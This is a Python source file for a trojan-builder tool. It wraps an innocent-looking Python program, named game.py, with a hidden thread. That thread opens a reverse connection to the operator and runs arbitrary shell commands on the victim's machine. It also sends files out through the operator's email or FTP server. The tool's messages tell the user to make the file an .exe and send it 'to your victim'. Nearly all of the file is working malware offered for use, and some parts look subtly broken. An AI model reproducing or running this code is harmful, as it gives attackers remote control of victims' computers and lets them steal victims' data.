from datetime import datetime
from getpass import getpass
from rich.console import Console

import os
import socket
import sys

def create_file(HOST, file_option, distractor):
    with open("game.py", "w") as f:
        f.write(f"""
try:
    from email.mime.base import MIMEBase 
    from email.mime.multipart import MIMEMultipart

    import ftplib
    import os
    import random
    import smtplib
    import socket
    import subprocess
    import sys
    import threading
    import time
except ImportError:
    subprocess.Popen("pip install ftplib smtplib, email.mime", capture_output=True)

{distractor}

def email_send(email_src, email_dst, src_passwd, file, client):
    msg = MIMEMultipart() 
    msg['Subject'] = "File"
    msg['From'] = email_src
    msg['To'] = email_dst

    part = MIMEBase('application','octet-stream')
    attachement = open(file,'rb')
    part.set_payload((attachement).read()) 
    msg.attach(part)

    server = smtplib.SMTP({file_option[1][3]}, 25)
    server.login(email_src, src_passwd)
    server.sendmail(email_src, email_dst, msg.as_string())
    server.quit()
    client.send("Done".encode())

def ftp_send(file):
    ftp = ftplib.FTP({str(file_option[1][0])})
    ftp.login({str(file_option[1][1])}, {str(file_option[1][2])})
    ftp.cwd("/pub/")
    ftp.storebinary("STOR " + os.path.basename(file), 
                    open(file, "rb"), 1024)
    ftp.quit()

def trojan():
    global client
    HOST = "{HOST}"
    PORT = 5555

    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        client.connect((HOST, PORT))
    
    except:
        pass
  
    else:
        terminal_mode = True
        client.send(sys.platform.encode())
        while True:
            try:
                server_command = client.recv(8192).decode()

                if server_command == "cmdon":
                    terminal_mode = True
                    client.send(b"Terminal mode activeted")
                    continue
                
                elif server_command == "cmdoff":
                    terminal_mode = False
                    client.send(b"Terminal mode disactiveted")
                    continue
            
                if terminal_mode:
                    output = subprocess.check_output(server_command, shell=True)
                    client.send(output if output != b'' else b"Done")
                    continue

                elif not terminal_mode and server_command.split()[0] in ( "ftp::recv", "email::recv", "ftp::cd"):
                    server_command = server_command.split()

                    if file_option[0] == 1: 
                        email_send(file_option[1][0], file_option[1][1], file_option[1][2], server_command[1], client)

                    elif file_option[0] == 2:
                        if server_command[0] == "ftp::recv":
                            ftp_send(server_command[1])   

                        elif server_command[0] == "ftp::cd":
                            ftplib.FTP.cwd(server_command[1])

                else:
                    client.send(b"Command not found...")
            
            except Exception as e:
                try:
                    client.send(str(e).encode())
                except:
                    pass

if __name__ == "__main__":
    file_option = {file_option}
    distractor_thread = threading.Thread(target=initialize)
    trojan_thread = threading.Thread(target=trojan)
    
    distractor_thread.start()
    trojan_thread.start()
""")

        console.print(f"""\n[bold blue][+][/bold blue] File generated, I suggest you to make it .exe, after this
send '{f.name}' to your victim""", style="bold blue")
        f.close()

def exit(server=None):
    console.print("\nExiting ...", style="bold red")
    if server:
        server.close()
    sys.exit(1)

def exiting(server, file, content):
    with open(file, "w") as f:
        console.print("\nRestoring file...", style="bold blue")
        f.write(content)
        
    console.print("Exiting ...", style="bold red")
    server.close()
    sys.exit()

def initialize():
    try:
        global console
        console = Console()
        show_banner()
        console.print("A tool for simple trojan creation\n", style="bold red")

        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

        while True:
            try:
                HOST = str(console.input("[bold blue][+][/bold blue] Enter your ip ─⟶ "))
                PORT = 5555
                server.bind((HOST, PORT))
            except OSError:
                console.print("[-] You can't use this ip, try another one", style="bold red")
            except KeyboardInterrupt:
                exit()
            else:
                break

        server.listen(1)

        console.print("""\nRULES:
1. THE FILE CAN'T HAVE A MAIN;
2. THE PRINCIPAL FUNCTION MUST BE NAMED INITIALIZE;
3. CAN'T HAVE FUNCTION NAMED: email_send, ftp_send, trojan""", style="bold red")

        extension = None
        while extension != "py":
            file = console.input("[bold blue][+][/bold blue] Enter the directory of the [bold blue]python[/bold blue] file where you want to inject the trojan: ")
            extension = file.split(".")[1]

        if os.name == "nt":
            import subprocess
            if console.input("[bold blue][+][/bold blue] Do you want to make .exe the file ? [bold blue]y/n[/bold blue] ") in ("Y", "y"):
                subprocess.check_output(f"pyinstaller {file}")
                file = f"{file.split('.')[0]}.exe"

        with open(file, "r") as f:
            content = f.read()

        if console.input("[bold blue][+][/bold blue] During the session can you have to transfer some file ? [bold blue]y/n[/bold blue] ") in ("Y", "y"):
            file_option = show_options_file()
            if file_option == 1:
                file_option = (1, take_email_credential())
            else:
                file_option = (2, take_ftp_credential())

        else:
            file_option = (None, (None, None, None, None))

        create_file(HOST, file_option, content)
        conn, addr = server.accept()
        console.print(f"Connected with [bold blue]{addr}[/bold blue]")
        
        console.print("\nCommands like: [bold blue]'cd'[/bold blue], [bold blue]'ping'[/bold blue], [bold blue]'iwconfig'[/bold blue] don't work")
        console.print("Type [bold blue]-h[/bold blue] or [bold blue]--help[/bold blue] to see options")
        console.print(f"OS: [bold blue]{conn.recv(2048).decode()}[/bold blue]")
        console.print(f"Attack time: {datetime.now()}\n", style="bold blue")
    
        send_command(conn, file_option)

    except KeyboardInterrupt:
        try:
            exiting(server, file, content)
        except Exception as e:
            exit(server)

def send_command(conn, file_option):
    while True:
        cmd = console.input("[bold blue][+][/bold blue] Enter a command:~# ")
        if cmd in ("-h", "--help"):
            show_options(file_option)

        else:
            conn.send(cmd.encode())
            console.print("--OUTPUT--", style="bold green")
            console.print(conn.recv(8192).decode(), style="green")

def show_banner():
    banner = """
                         \ __
    --==/////////////[})))==*
                     / \ '          ,|
                        `\`\      //|                             ,|
                          \ `\  //,/'                           -~ |
       )             _-~~~\  |/ / |'|                       _-~  / ,
      ((            /' )   | \ / /'/                    _-~   _/_-~|
     (((            ;  /`  ' )/ /''                 _ -~     _-~ ,/'
     ) ))           `~~\   `\ /'/|'           __--~~__--\ _-~  _/, 
    ((( ))            / ~~    \ /~      __--~~  --~~  __/~  _-~ /
     ((\~\           |    )   | '      /        __--~~  \-~~ _-~
        `\(\    __--(   _/    |'\     /     --~~   __--~' _-~ ~|
         (  ((~~   __-~        \~\   /     ___---~~  ~~\~~__--~ 
          ~~\~~~~~~   `\-~      \~\ /           __--~~~'~~/
                       ;\ __.-~  ~-/      ~~~~~__\__---~~ _..--._
                       ;;;;;;;;'  /      ---~~~/_.-----.-~  _.._ ~\     
                      ;;;;;;;'   /      ----~~/         `\,~    `\ \        
                      ;;;;'     (      ---~~/         `:::|       `\|      
                      |'  _      `----~~~~'      /      `:|        ()))),      
                ______/\/~    |                 /        /         (((((())  
              /~;;.____/;;'  /          ___.---(   `;;;/             )))'`))
             / //  _;______;'------~~~~~    |;;/\    /                ((   ( 
            //  \ \                        /  |  \;;,\                 `   
           (<_    \ \                    /',/-----'  _> 
            \_|     \!_                 //~;~~~~~~~~~ 
                     \_|               (,~~ 
                                        \~\.
                                         ~~
    
    """

    console.print(banner, style="bold yellow")

def show_options(file_option):
    console.print("\n[bold blue]cmdon[/bold blue]\t\tto active the terminal mode")
    console.print("[bold blue]cmdoff[/bold blue]\t\tto disactive the terminal mode")

    if file_option[0] == 1:
        console.print("\n[bold blue]email::recv[/bold blue]\tto receive a file")
    elif file_option[0] == 2:
        console.print("\n[bold blue]ftp::recv[/bold blue]\tto receive a file")
        console.print("[bold blue]ftp::cd[/bold blue]\t\tto change the directory a file")
    
    console.print("""\nThis commands [bold blue]don't[/bold blue] work:[bold blue]
    - ifconfig eth0 up/down
    - sudo 
    - cd
    - iwconfig
    - ping[/bold blue]""")

def show_options_file():
    console.print("\nSo, how do you want to receive them ?", style="bold blue")
    console.print("[bold blue][1][/bold blue] via mail")
    console.print("[bold blue][2][/bold blue] via ftp server")
    option = None
    while option not in (1, 2, 3):
        try:
            option = int(console.input("[bold blue][+][/bold blue] Type the option: "))
            if option not in (1, 2, 3):
                raise ValueError
        except ValueError:
            console.print("Invalid option", style="italic yellow")
            continue

    return option


def take_email_credential():
    email_src = console.input("\n[bold blue][+][/bold blue] Enter the email that will [bold blue]send[/bold blue] the file: ")
    email_dst = console.input("[bold blue][+][/bold blue] Enter the email where you want to [bold blue]receive[/bold blue] the file: ")
    src_passwd = getpass("Enter the password of the src email: ")
    server = console.input("[bold blue][+][/bold blue] Enter the [bold blue]server[/bold blue]: ")
    console.print(f"So your credential are: [bold blue]{email_src}, {email_dst}, {'*' * len(src_passwd)}, {server}[/bold blue]")

    return email_src, email_dst, src_passwd, server

def take_ftp_credential():
    ftp_address = console.input("\n[bold blue][+][/bold blue] Enter the address of the ftp server where you'll [bold blue]recv[/bold blue] the file: ")
    ftp_username = console.input("[bold blue][+][/bold blue] Enter the username you'll use to login: ")
    ftp_passwd = getpass("Enter the password of the server: ")
    console.print(f"So your credential are: [bold blue]{ftp_address}, {ftp_username}, {'*' * len(ftp_passwd)}[/bold blue]")

    return ftp_address, ftp_username, ftp_passwd, None
